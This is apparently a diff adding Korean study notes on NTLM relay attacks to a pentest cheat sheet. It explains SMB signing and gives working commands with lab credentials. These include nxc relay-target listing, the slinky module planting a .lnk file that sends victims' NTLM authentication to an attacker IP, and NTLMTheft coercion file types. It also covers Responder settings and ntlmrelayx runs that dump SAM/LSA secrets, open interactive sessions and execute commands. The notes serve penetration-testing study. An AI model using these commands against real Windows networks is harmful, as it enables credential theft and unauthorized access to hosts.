@@ -1236,3 +1236,131 @@ KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.p
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>NTLM Relay</strong></summary>
+
+# NTLM Relay 공격 정리
+## 1. 공격 개요
+
+NTLM Relay 공격은 피해자의 NTLM 인증을 **중간에서 가로채 다른 서버에 그대로 전달**하는 공격입니다.
+해시를 크랙할 필요 없이 인증 자체를 재사용하는 것이 핵심입니다.
+
+```
+피해자 → (NTLM 인증 캡처) → 공격자 → (인증 그대로 전달) → 대상 서버
+```
+
+---
+
+## 2. SMB Signing
+
+### 개념
+
+SMB 패킷에 **디지털 서명**을 적용해 패킷의 무결성을 보장하는 보안 기능입니다.
+
+```
+Signing 활성화:   클라이언트 → [서명된 패킷] → 서버  ✅ 변조 감지 가능
+Signing 비활성화: 클라이언트 → [서명 없는 패킷] → 서버  ❌ 중간자 공격 가능
+```
+
+### 릴레이 공격과의 관계
+
+공격자는 클라이언트의 서명 키를 알 수 없기 때문에 **Signing이 활성화된 서버에는 릴레이가 불가능**합니다.
+따라서 릴레이 공격은 반드시 **SMB Signing이 비활성화된 호스트**를 대상으로 해야 합니다.
+
+> Windows Server 2025부터 SMB Signing이 기본 활성화되어 이 공격 벡터가 크게 줄었습니다.
+
+---
+
+## 3. 단계별 공격 흐름
+
+### 3-1단계: 릴레이 대상 수집 (gen-relay-list)
+
+```bash
+nxc smb 192.168.121.172-174 -u 'Eric.Wallows' -p 'EricLikesRunning800' --gen-relay-list smb_targets.txt
+```
+
+- 작동하지 않는 경우 발생.
+- 수동으로 각 ip에 접속해서 리스트 생성.
+
+---
+
+### 3-2단계: NTLM 인증 유도
+
+#### 방법 1: Slinky 모듈 (nxc)
+
+```bash
+nxc smb 192.168.121.173 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M slinky -o SERVER=192.168.45.159 NAME=README
+```
+
+| 옵션 | 설명 |
+|---|---|
+| `-M slinky` | slinky 모듈 사용 |
+| `SERVER=192.168.45.159` | 공격자 서버 IP |
+| `NAME=README` | 생성할 .lnk 파일 이름 |
+
+**동작 원리:**
+1. 대상 SMB 공유에 `README.lnk` 파일 생성
+2. 피해자가 탐색기로 해당 폴더를 열면 자동으로 트리거
+3. 피해자의 NTLM 인증이 공격자 서버로 전송
+
+> `.lnk` 파일은 클릭하지 않아도 탐색기에서 폴더를 열기만 해도 트리거됩니다.
+
+#### 방법 2: NTLMTheft
+
+다양한 파일 포맷을 생성하여 수동으로 업로드하는 방식입니다.
+
+| 파일 포맷 | 트리거 조건 |
+|---|---|
+| `.lnk` | 탐색기로 폴더 열기 |
+| `.url` | 탐색기로 폴더 열기 |
+| `.scf` | 탐색기로 폴더 열기 |
+| `desktop.ini` | 폴더 열기 (숨김 파일, 자동 실행) |
+| `.docx`, `.xlsx` | Office 파일 열기 |
+
+---
+
+### 3-3단계: NTLM 릴레이 실행
+
+#### Responder 설정
+
+릴레이 공격 시 SMB, HTTP를 반드시 **OFF**로 설정해야 합니다.
+
+```bash
+# /etc/responder/Responder.conf
+SMB = Off
+HTTP = Off
+```
+
+- Responder 역할: LLMNR/NBT-NS 포이즈닝으로 피해자를 공격자 IP로 **유도**
+- ntlmrelayx 역할: 실제 NTLM 인증 **캡처 및 릴레이**
+- `lnk`파일을 업로드 할 수 있는 상황이라면 Responder를 사용하지 않아도 유도 가능.
+
+#### ntlmrelayx 실행
+
+```bash
+# 기본 실행 (SAM 자동 덤프 시도)
+ntlmrelayx.py -tf smb_targets.txt -smb2support
+
+# 대화형 세션 획득
+ntlmrelayx.py -tf smb_targets.txt -smb2support -i
+
+# 명령 실행
+ntlmrelayx.py -tf smb_targets.txt -smb2support -c "whoami"
+
+# LSA 명시적 덤프
+ntlmrelayx.py -tf smb_targets.txt -smb2support --lsa
+```
+---
+
+## 5. LSA/SAM 덤핑
+
+### 권한 조건
+
+```
+릴레이 성공 + 관리자 권한 O  →  LSA/SAM 덤핑 성공 ✅
+릴레이 성공 + 관리자 권한 X  →  덤핑 실패, 접근 거부 ❌
+```
+  
+</details>
